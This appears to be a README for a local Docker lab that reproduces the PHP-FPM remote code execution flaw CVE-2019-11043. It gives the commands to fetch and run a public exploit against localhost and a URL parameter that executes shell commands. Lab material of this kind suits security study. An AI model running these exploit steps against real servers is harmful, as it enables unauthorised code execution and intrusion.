# Code Exection
A server vulnerable to remote code
execution (CVE-2019-11043).

## Execution
```bash
docker compose up -d

# Pull the exploit and execute it
go get github.com/neex/phuip-fpizdam
phuip-fpizdam http://localhost:8080/index.php
```

The website runs on http://localhost:8080.

Run http://localhost:8080/index.php?a=id to
execute the `id` command. The output will come back
with the webpage. Root permissions aren't available,
so file output operations won't work.

# Made with ❤ by [Param](https://www.paramsid.com).